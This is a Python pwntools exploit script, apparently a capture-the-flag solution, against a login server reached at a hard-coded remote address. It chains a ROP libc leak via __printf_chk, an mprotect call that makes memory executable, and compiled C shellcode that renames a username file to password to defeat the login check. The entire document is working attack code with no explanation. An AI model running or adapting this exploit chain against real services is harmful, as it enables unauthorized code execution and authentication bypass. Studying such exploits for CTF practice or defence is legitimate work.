#!/usr/bin/env python3
from pwn import *

PERCENT_S_NEWLINE = 0x4019c8
POP_RSI_RET = 0x4017fa
POP_RDI_RET = 0x4019a3
PRINTF_CHK_GOT = 0x603090
RET = 0x401545
USERNAME_READER = 0x4014c0
PRINTF_CHK_LIBC = 0x131040
MPROTECT_LIBC = 0x11bb00
WORK_PAGE = 0x603000
WORK_ADDR = 0x603150
WORK_SIZE = 0xeb0
PAGE_SIZE = 0x1000
POP_RSP_RET = 0x401063
MOV_RDI_R12_CALL_RBP = 0x40183c
POP_RBP_RET = 0x400f08
READ_LIBC = 0x111130


def cc(src):
    with tempfile.TemporaryDirectory() as workdir:
        with open(os.path.join(workdir, 'shellcode.c'), 'w') as fp:
            fp.write(src)
        with open(os.path.join(workdir, 'shellcode.lds'), 'w') as fp:
            fp.write('''
SECTIONS {
    .shellcode : {
        *(.text)
        *(.rodata*)
    }
    /DISCARD/ : { *(*) }
}
''')
        subprocess.check_call([
            'gcc',
            '-Os',
            '-fno-stack-protector',
            '-fcf-protection=none',
            '-Wall', '-Wextra', '-Werror',
            '-nostartfiles',
            '-Wl,--build-id=none',
            '-Wl,-script=shellcode.lds',
            'shellcode.c',
            '-o', 'shellcode.elf',
        ], cwd=workdir)
        subprocess.check_call([
            'objcopy',
            '-O', 'binary',
            '--only-section=.shellcode',
            'shellcode.elf', 'shellcode.bin',
        ], cwd=workdir)
        subprocess.check_call([
            'objdump',
            '-b', 'binary',
            '-m', 'i386:x86-64',
            '-D',
            'shellcode.bin',
        ], cwd=workdir)
        with open(os.path.join(workdir, 'shellcode.bin'), 'rb') as fp:
            return fp.read()


STAGE3 = cc(r'''
#include <stddef.h>
#include <syscall.h>
#include <unistd.h>

__attribute__((always_inline)) static inline long
xsyscall(int number, long arg1, long arg2, long arg3, long arg4, long arg5,
         long arg6) {
  register int rax asm("rax") = number;
  register long rdi asm("rdi") = arg1;
  register long rsi asm("rsi") = arg2;
  register long rdx asm("rdx") = arg3;
  register long r10 asm("r10") = arg4;
  register long r8 asm("r8") = arg5;
  register long r9 asm("r9") = arg6;
  asm volatile("syscall\n"
               : "+r"(rax), "+r"(rdx)
               : "r"(rdi), "r"(rsi), "r"(r10), "r"(r8), "r"(r9)
               : "rcx", "r11", "memory", "cc");
  return rax;
}

__attribute__((always_inline)) static inline ssize_t
xwrite(int fd, const void *buf, size_t count) {
  return xsyscall(__NR_write, fd, (long)buf, count, 0, 0, 0);
}

__attribute__((always_inline, noreturn)) static inline void
xexit(int status) {
  xsyscall(__NR_exit, status, 0, 0, 0, 0, 0);
  __builtin_unreachable();
}

__attribute__((always_inline)) static inline int
xrename(const char *oldpath, const char *newpath) {
  return xsyscall(__NR_rename, (long)oldpath, (long)newpath, 0, 0, 0, 0);
}

__attribute__((always_inline)) static inline char *
xstrcpy(char *dest, const char *src) {
  int i = 0;
  while (src[i]) {
    dest[i] = src[i];
    i++;
  }
  dest[i] = 0;
  return dest;
}

__attribute__((always_inline)) static inline char *
xstrcat(char *dest, const char *src) {
  int i = __builtin_strlen(dest);
  xstrcpy(dest + i, src);
  return dest;
}

__attribute__((used)) static void
shellcode() {
  void **frame = __builtin_frame_address(0);
  char *workdir = frame[7];
  xwrite(STDOUT_FILENO, workdir, __builtin_strlen(workdir));
  xwrite(STDOUT_FILENO, "\n", 1);
  char oldpath[100];
  xstrcpy(oldpath, workdir);
  xstrcat(oldpath, "/username");
  char newpath[100];
  xstrcpy(newpath, workdir);
  xstrcat(newpath, "/password");
  xrename(oldpath, newpath);
  xexit(0);
}
''')


def connect():
    if args.LOCAL:
        if args.STRACE:
            return process(['strace', '-f', '-o', 'strace.out', './server.py'])
        else:
            return process(['./server.py'])
    else:
        return remote('69.90.132.134', 3317)


def scanf_ok(x):
    # https://reverseengineering.stackexchange.com/a/10596
    return b'\x09' not in x and \
           b'\x0a' not in x and \
           b'\x0b' not in x and \
           b'\x0c' not in x and \
           b'\x0d' not in x and \
           b'\x20' not in x


def send_stage1(tube):
    tube.recvuntil(b'Username: ')
    payload = flat({
        0: b'admin\0',
        0x38: b''.join((
            struct.pack('<QQ', POP_RDI_RET, 1),
            struct.pack('<QQ', POP_RSI_RET, PERCENT_S_NEWLINE),
            # pop rdx; mov eax, 1; pop rbx; pop rbp; retn
            struct.pack('<QQQQ', 0x400e8f, PRINTF_CHK_GOT, 0, 0),
            # call ___printf_chk; pop rdx; mov eax, 1; pop rbx; pop rbp; retn
            struct.pack('<QQQQ', 0x400e8a, 0, 0, 0),
            # it just so happens that r12 == IPC *, so we can restart
            struct.pack('<QQ', POP_RBP_RET, USERNAME_READER),
            struct.pack('<Q', MOV_RDI_R12_CALL_RBP),
        )),
    })
    assert scanf_ok(payload), payload.hex()
    # input('stage1')
    tube.sendline(payload)
    printf_chk, = struct.unpack('<Q', tube.recvn(6).ljust(8, b'\x00'))
    libc = printf_chk - PRINTF_CHK_LIBC
    print(f'libc: 0x{libc:x}')
    assert libc & 0xfff == 0
    return libc


def send_stage2(tube, libc):
    tube.recvuntil(b'Username: ')
    payload = flat({
        0: b'admin\0',
        0x38: b''.join((
            struct.pack('<QQ', POP_RDI_RET, WORK_PAGE),
            struct.pack('<QQ', POP_RSI_RET, PAGE_SIZE),
            # pop rdx; mov eax, 1; pop rbx; pop rbp; retn
            struct.pack('<QQQQ', 0x400e8f, 0x7, 0, 0),
            struct.pack('<Q', libc + MPROTECT_LIBC),
            struct.pack('<QQ', POP_RDI_RET, 0),
            struct.pack('<QQ', POP_RSI_RET, WORK_ADDR),
            # pop rdx; mov eax, 1; pop rbx; pop rbp; retn
            struct.pack('<QQQQ', 0x400e8f, WORK_SIZE, 0, 0),
            struct.pack('<Q', RET),
            struct.pack('<Q', libc + READ_LIBC),
            struct.pack('<Q', RET),
            struct.pack('<Q', WORK_ADDR),
        ))
    })
    assert scanf_ok(payload)
    # input('stage2')
    tube.sendline(payload)


def pwn_once(tube):
    libc = send_stage1(tube)
    send_stage2(tube, libc)
    input('stage3')
    tube.send(STAGE3)
    tube.recvuntil(b'Password: ')
    tube.sendline(b'admin')


def main():
    with connect() as tube:
        pwn_once(tube)
        tube.interactive()


if __name__ == '__main__':
    main()
